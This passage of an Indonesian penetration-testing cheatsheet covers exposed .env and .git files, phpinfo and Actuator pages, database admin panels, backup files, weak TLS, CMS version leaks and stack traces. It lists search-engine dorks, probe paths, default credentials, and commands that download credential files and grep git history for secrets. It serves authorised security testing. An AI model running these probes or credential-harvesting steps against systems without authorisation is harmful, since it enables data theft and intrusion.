site:target.com ext:env

# Shodan
http.html:"DB_PASSWORD" port:80,443
http.html:"APP_KEY" port:80,443

# Nuclei
nuclei -u https://target.com -tags exposure,config
```

## Langkah

```bash
# ===== Common .env locations =====
GET /.env
GET /.env.local
GET /.env.development
GET /.env.production
GET /.env.staging
GET /.env.backup
GET /.env.bak
GET /.env.old
GET /.env.save
GET /.env.example          # kadang berisi real values!
GET /.env.sample

# ===== Framework-specific =====
# Laravel
GET /.env                  # APP_KEY, DB_PASSWORD, MAIL_PASSWORD, AWS keys

# Node.js
GET /.env                  # DATABASE_URL, JWT_SECRET, API_KEY

# Python/Django
GET /.env                  # SECRET_KEY, DATABASE_URL

# Ruby on Rails
GET /.env                  # RAILS_MASTER_KEY, DATABASE_URL

# ===== Content yang dicari =====
# DB_PASSWORD=, SECRET_KEY=, API_KEY=, AWS_SECRET=
# MAIL_PASSWORD=, SMTP_PASSWORD=, JWT_SECRET=
# STRIPE_SECRET=, PAYPAL_SECRET=, REDIS_PASSWORD=

# ===== Nuclei scan =====
nuclei -u https://target.com -tags exposure,config
```

## Bukti
- File .env bisa didownload (200 OK)
- Berisi credentials: DB password, API keys, secrets
- Screenshot konten .env

---

# 28. Git Repository Exposure (.git)

**Kategori**: Sensitive Data Exposure | **OWASP**: A02  
**Tujuan**: Folder .git terbuka → seluruh source code bisa di-download

## Dork
```
# Google Dork
inurl:"/.git/HEAD" | inurl:"/.git/config"
intext:"ref: refs/heads/" ext:HEAD
inurl:"/.git/" intitle:"Index of"

# Shodan
http.html:"refs/heads" port:80,443
http.html:".git/HEAD" port:80

# Tool
git-dumper https://target.com/.git/ ./output/
```

## Langkah

```bash
# ===== Detection =====
GET /.git/HEAD                    # ref: refs/heads/main
GET /.git/config                  # remote URL, user info
GET /.git/index                   # file index (binary)
GET /.git/logs/HEAD               # commit history
GET /.git/refs/heads/main         # commit hash

# Jika salah satu return 200 → .git exposed!

# ===== Download full repo =====
# Tool: git-dumper
pip install git-dumper
git-dumper https://target.com/.git/ ./output/

# Tool: GitTools
python3 gitdumper.py https://target.com/.git/ ./output/
python3 extractor.py ./output/ ./extracted/

# ===== Manual download =====
wget -r https://target.com/.git/
cd target.com
git checkout -- .    # Restore source code

# ===== Extract secrets dari git history =====
# Di folder yang sudah di-download:
git log --oneline
git log --all --full-history -- "*.env"
git log --all --full-history -- "*password*"
git log -p | grep -E "(password|secret|key|token)" -i

# Tool: truffleHog, gitleaks
trufflehog filesystem ./output/
gitleaks detect --source ./output/

# ===== SVN equivalent =====
GET /.svn/entries
GET /.svn/wc.db
svn-extractor https://target.com/.svn/
```

## Bukti
- `.git/HEAD` mengembalikan ref branch
- Full source code berhasil di-download
- Secrets/credentials ditemukan di git history

---

# 29. phpinfo() Exposure

**Kategori**: Information Disclosure | **OWASP**: A05  
**Tujuan**: Halaman phpinfo() terbuka menampilkan seluruh konfigurasi PHP

## Dork
```
# Google Dork
intitle:"phpinfo()" | inurl:"phpinfo.php" | inurl:"info.php"
inurl:"test.php" | inurl:"php.php" intitle:"phpinfo"
intext:"PHP Version" intext:"Configuration" intext:"Environment"

# Shodan
http.html:"phpinfo()" port:80,443
http.title:"phpinfo()" port:80

# Nuclei
nuclei -u https://target.com -tags phpinfo
```

## Langkah

```bash
# ===== Common phpinfo locations =====
GET /phpinfo.php
GET /info.php
GET /php_info.php
GET /test.php
GET /i.php
GET /php.php
GET /temp.php
GET /p.php

# ===== Info sensitif di phpinfo =====
# - PHP Version
# - Server OS & Architecture
# - Loaded modules (mod_ssl, mod_rewrite)
# - Document Root path
# - SMTP server & credentials
# - Database extensions (mysql, pgsql)
# - Environment variables (bisa ada API keys)
# - Session save path
# - open_basedir, disable_functions
# - $_SERVER variables (IP, hostname)
# - $_ENV variables (bisa ada secrets)

# ===== Nuclei =====
nuclei -u https://target.com -tags phpinfo
```

## Bukti
- Halaman phpinfo terbuka dengan PHP version + full config
- Environment variables mengandung credentials
- Screenshot phpinfo page

---

# 30. Server Status & Monitoring Pages

**Kategori**: Information Disclosure | **OWASP**: A05  
**Tujuan**: Halaman monitoring/status server terbuka publik

## Dork
```
# Google Dork
intitle:"Apache Status" | inurl:"/server-status" | inurl:"/server-info"
inurl:"/actuator" | inurl:"/actuator/env" | inurl:"/actuator/heapdump"
inurl:"/elmah.axd" | inurl:"/trace.axd"  # .NET
inurl:"/debug/vars"  # Go

# Shodan
http.title:"Apache Status" port:80
"X-Application-Context" port:8080  # Spring Boot
http.html:"actuator" port:8080,8443
```

## Langkah

```bash
# ===== Apache =====
GET /server-status           # Apache mod_status
GET /server-info             # Apache mod_info

# ===== Nginx =====
GET /nginx_status            # Nginx stub_status
GET /status

# ===== PHP-FPM =====
GET /fpm-status
GET /php-fpm-status

# ===== Application Monitoring =====
GET /health                  # Health check endpoint
GET /healthcheck
GET /actuator                # Spring Boot Actuator
GET /actuator/env            # Environment variables!
GET /actuator/configprops    # Config properties
GET /actuator/heapdump       # Memory dump!
GET /actuator/mappings       # All URL mappings
GET /metrics
GET /stats
GET /debug/vars              # Go debug

# ===== Error/Log Pages =====
GET /elmah.axd               # .NET error log
GET /trace.axd               # .NET trace
GET /errors/                 # Error log viewer

# ===== Nuclei =====
nuclei -u https://target.com -tags status,actuator,debug
```

## Bukti
- Server-status menampilkan active connections + client IPs
- Spring Boot Actuator mengekspos env variables + heap dump
- Screenshot monitoring page terbuka

---

# 31. Database Admin Panel Exposure

**Kategori**: Security Misconfiguration | **OWASP**: A05  
**Tujuan**: phpMyAdmin, Adminer, atau DB admin tool terbuka publik

## Dork
```
# Google Dork
inurl:"phpmyadmin" | inurl:"/pma/" | inurl:"/dbadmin/" intitle:"phpMyAdmin"
inurl:"adminer.php" intitle:"Adminer"
inurl:"pgadmin" | inurl:"mongo-express" | inurl:"redis-commander"

# Shodan
http.title:"phpMyAdmin" port:80,443,8080
http.title:"Adminer" port:80,443
http.title:"pgAdmin" port:80,5050
http.title:"mongo-express" port:8081
```

## Langkah

```bash
# ===== phpMyAdmin =====
GET /phpmyadmin/
GET /pma/
GET /phpMyAdmin/
GET /mysql/
GET /dbadmin/
GET /sql/
GET /myadmin/

# ===== Adminer =====
GET /adminer.php
GET /adminer/

# ===== pgAdmin =====
GET /pgadmin/
GET /pgadmin4/

# ===== MongoDB =====
GET /mongo-express/
GET /rockmongo/

# ===== Redis =====
GET /redis-commander/
GET /phpRedisAdmin/

# ===== Other DB Tools =====
GET /phpliteadmin.php         # SQLite
GET /webmin/                  # Webmin panel
GET /arangodb/                # ArangoDB
GET /couchdb/_utils/          # CouchDB Fauxton

# ===== Default Credentials =====
# phpMyAdmin: root:(empty), root:root
# Adminer: root:(empty)
# MongoDB: (no auth)
# Redis: (no auth)
```

## Bukti
- Login page phpMyAdmin/Adminer terbuka di browser
- Login berhasil dengan default credential
- Screenshot database admin panel

---

# 32. Source Code Disclosure

**Kategori**: Sensitive Data Exposure | **OWASP**: A02  
**Tujuan**: Source code terbaca via misconfiguration atau file backup

## Dork
```
# Google Dork
site:target.com ext:bak | ext:old | ext:save | ext:swp
site:target.com ext:inc | ext:phps | ext:config
inurl:".DS_Store" | inurl:"WEB-INF/web.xml"
intitle:"Index of" intext:".php.bak" | intext:".config.old"

# Shodan
http.html:".bak" http.title:"Index of" port:80
http.html:"WEB-INF" port:8080
```

## Langkah

```bash
# ===== Tilde backup files (editor temp) =====
GET /index.php~
GET /config.php~
GET /wp-config.php~
GET /settings.py~

# ===== .bak / .old / .save files =====
GET /index.php.bak
GET /config.php.old
GET /database.yml.save
GET /app.js.bak

# ===== SWP files (Vim) =====
GET /.index.php.swp
GET /.config.php.swp
GET /.htaccess.swp

# ===== DS_Store (macOS) =====
GET /.DS_Store
# Tool: ds_store_parser
python3 ds_store_parser.py https://target.com/.DS_Store

# ===== WEB-INF (Java) =====
GET /WEB-INF/web.xml
GET /WEB-INF/classes/
GET /WEB-INF/lib/

# ===== Misconfigured PHP =====
# Server menampilkan PHP code bukan eksekusi:
GET /index.phps                 # PHP source view
GET /config.inc                 # PHP include file

# ===== Framework config =====
GET /config/database.yml        # Rails
GET /settings.py                # Django
GET /application.properties     # Spring Boot
GET /appsettings.json          # .NET
GET /web.config                # ASP.NET

# ===== Nuclei =====
nuclei -u https://target.com -tags backup,exposure
```

## Bukti
- Source code PHP/Python/JS terbaca
- Database credentials ada di config file
- Screenshot source code yang ter-expose

---

# 33. SSL/TLS Misconfiguration

**Kategori**: Security Misconfiguration | **OWASP**: A05  
**Tujuan**: Cipher lemah, protocol lama, atau certificate issues

## Dork
```
# Shodan — SSL/TLS specific
ssl.version:"sslv3" port:443  # SSLv3 POODLE
ssl.version:"tlsv1" port:443  # TLS 1.0 deprecated
ssl.cert.expired:true port:443  # Expired certificate
ssl.cert.issuer.cn:"self-signed" port:443  # Self-signed
ssl:"RC4" port:443  # Weak cipher

# Online Tools
# https://www.ssllabs.com/ssltest/analyze.html?d=target.com
# https://observatory.mozilla.org/
```

## Langkah

```bash
# ===== testssl.sh (comprehensive) =====
./testssl.sh https://target.com

# ===== SSLyze =====
sslyze --regular target.com

# ===== Nmap SSL scan =====
nmap --script ssl-enum-ciphers -p 443 target.com
nmap --script ssl-cert -p 443 target.com

# ===== Check specific issues =====
# TLS 1.0 / 1.1 (deprecated)
openssl s_client -connect target.com:443 -tls1
openssl s_client -connect target.com:443 -tls1_1

# SSLv3 (POODLE)
openssl s_client -connect target.com:443 -ssl3

# Weak ciphers
openssl s_client -connect target.com:443 -cipher RC4
openssl s_client -connect target.com:443 -cipher DES
openssl s_client -connect target.com:443 -cipher NULL

# Certificate issues
openssl s_client -connect target.com:443 | openssl x509 -text
# Check: expiry, CN mismatch, self-signed, weak key

# ===== Online tools =====
# https://www.ssllabs.com/ssltest/
# https://observatory.mozilla.org/
```

## Bukti
- TLS 1.0/1.1 masih aktif
- Weak ciphers (RC4, DES, NULL) diterima
- Certificate expired/self-signed/mismatch
- Screenshot dari testssl.sh atau SSL Labs

---

# 34. Drupal / CMS Generic Disclosure

**Kategori**: 🏷️ CMS Disclosure | **OWASP**: A05  
**Tujuan**: Versi Drupal dan CMS lainnya terekspos

## Dork
```
# Google Dork
inurl:"/CHANGELOG.txt" intext:"Drupal" | inurl:"/core/CHANGELOG.txt"
inurl:"/update.php" intitle:"Drupal"
intext:"Generator" intext:"Drupal" site:target.com
inurl:"/magento_version" | inurl:"/RELEASE_NOTES.txt"  # Magento

# Shodan
http.html:"Drupal" port:80,443
http.html:"Magento" port:80,443

# Tool
droopescan scan drupal -u https://target.com
cmsmap https://target.com
```

## Langkah

```bash
# ===== Drupal =====
GET /CHANGELOG.txt              # Version history
GET /INSTALL.txt
GET /README.txt
GET /core/CHANGELOG.txt         # Drupal 8+
GET /core/install.php
GET /update.php                 # Update script
GET /user/login                 # Login page
GET /admin/                     # Admin panel

# Drupal version dari header/generator
curl -s https://target.com | grep "Drupal"
# <meta name="Generator" content="Drupal 9" />

# Droopescan
droopescan scan drupal -u https://target.com

# ===== Magento =====
GET /magento_version            # Version info
GET /RELEASE_NOTES.txt
GET /downloader/                # Magento Connect
GET /admin/                     # Admin panel
# magescan
magescan scan:all https://target.com

# ===== Shopify / SaaS detection =====
curl -s -I https://target.com | grep -i "x-shopify\|x-wix\|x-squarespace"

# ===== Generic CMS detection =====
# WhatWeb
whatweb https://target.com

# Wappalyzer (browser extension)
# BuiltWith
curl -s https://target.com | grep -iE "generator|powered.by|cms|platform"

# ===== CMSMap (multi-CMS) =====
cmsmap https://target.com
```

## Bukti
- Versi CMS terlihat dari CHANGELOG/meta tag
- Admin panel terbuka
- Screenshot version disclosure

---

# 35. Stack Trace & Error Code Exposure

**Kategori**: Information Disclosure | **OWASP**: A05  
**Tujuan**: Error menampilkan full stack trace, SQL query, file path

## Dork
```
# Google Dork
intext:"Traceback (most recent call last)" ext:py  # Python/Django
intext:"at java." | intext:"at org." intext:"Exception"  # Java
intext:"YSOD" | intext:"Server Error in" ext:aspx  # ASP.NET
intext:"Error in" intext:"on line" intext:"/var/www/" ext:php  # PHP
intext:"ReferenceError" | intext:"TypeError" intext:"node_modules"  # Node.js

# Shodan
http.html:"Traceback" port:80,443  # Python
http.html:"stack trace" port:80,443
http.html:"Whitelabel Error" port:8080  # Spring Boot
```

## Langkah

```bash
# ===== Trigger errors pada berbagai framework =====

# PHP
GET /page.php?id=test'           # SQL error + stack trace
GET /api/data?type[]=x           # Type error

# Laravel
GET /api/undefined-route         # Ignition error page
POST /api/login                  # Empty body → exception

# Django
GET /nonexistent/page            # DEBUG=True → yellow error page
# Menampilkan: settings, installed apps, middleware, traceback

# Spring Boot (Java)
GET /api/users/abc               # NumberFormatException
# Menampilkan: class path, method, line number

# Node.js / Express
GET /api/data?callback=<script>  # Unhandled error
# Menampilkan: stack trace, file path, node_modules

# ASP.NET
GET /page.aspx?id=test'          # YSOD (Yellow Screen of Death)
# Menampilkan: source code, stack trace, config

# Ruby on Rails
GET /api/users/abc               # ActionController error
# Menampilkan: routes, params, session

# ===== Error codes yang membocorkan info =====
# 500: Internal Server Error + stack trace
# 502: Bad Gateway → backend server info
# 503: Service Unavailable → server name
# 403: Forbidden + path disclosure
# 404: Not Found + framework info

# ===== HTTP method testing =====
OPTIONS /api/users               # Allowed methods
TRACE /api/users                 # Request reflection
PUT /api/users                   # Method not allowed + info

# ===== Nuclei =====
nuclei -u https://target.com -tags error,disclosure,tech
```

## Bukti
- Full stack trace dengan file path + line number
- SQL query terlihat di error message
- Framework/DB version terekspos
- Screenshot error page dari setiap framework

---

> ⚠️ **DISCLAIMER**: Semua teknik di cheatsheet ini hanya untuk **ethical hacking** dan **penetration testing yang sudah diotorisasi**. Penggunaan tanpa izin merupakan pelanggaran hukum.
